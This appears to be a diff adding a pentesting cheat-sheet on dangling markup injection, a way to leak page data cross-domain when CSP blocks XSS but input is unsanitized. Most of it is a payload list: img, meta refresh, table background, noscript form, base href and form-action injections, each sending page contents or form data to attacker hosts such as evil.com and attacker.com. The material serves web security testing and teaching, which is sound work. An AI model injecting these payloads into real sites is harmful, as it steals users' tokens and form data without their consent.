@@ -1,0 +1,57 @@
+-----------------------------------------------------------------------+
+Dangling Markup Injection
+-----------------------------------------------------------------------+
+
+Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible
+
+~ suppose an application doesnt filter special characters but has CSP or other means to stop XSS then even though you can inject harmful characters the xss will not execute
+~ ** REMEMBER that dangling markup injection is only present if xss does not execute but characters are not sanitized**
+~ anywhere in the application where your input is reflected can be a door to dangling markup similar to how you would look for XSS
+
+eg following  CSP headers are present
+
+X-Content-Security-Policy: allow 'self' *.example.com
+X-Content-Security-Policy: allow 'self'; img-src *; script-src www.example.com
+
+~ an attacker can put "><img src='//attacker-website.com?  , what this does is all the code after the injected point will be sent to the attackers server as a request eg
+
+<body backround-color="blue">
+
+<input type"text" name="search">
+<script> your results for "><img src='//attacker-website.com? is </script>
+<Label>Name : tester</Label>
+
+now in the above all the data from attack-website.com? onwards will be sent to attacker up till the end of page and special characters will be url encoded
+
+Payloads---------------------------------------------------------------------------+
+
+<img src='http://attacker.com/log.php?HTML=
+
+if image tag is also blocked by CSP
+
+<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
+<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
+
+<table background='//your-collaborator-id.burpcollaborator.net?'
+
+<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
+<noscript> Is a tag whose content will be interpreted if the browser doesn't support javascript
+
+Stealing Forms----------------------------+
+
+<base href='http://evil.com/'>
+now all forms sending data will send to the attackers website
+
+
+<form action='http://evil.com/log_steal'>
+This will replace the next form tag and dataill be sent to attacker domain
+
+
+<button name=xss type=submit formaction='https://google.com'>I get consumed!
+The button can change the URL where the information of the form is going to be sent with the attribute "formaction"
+
+
+
+
+
+
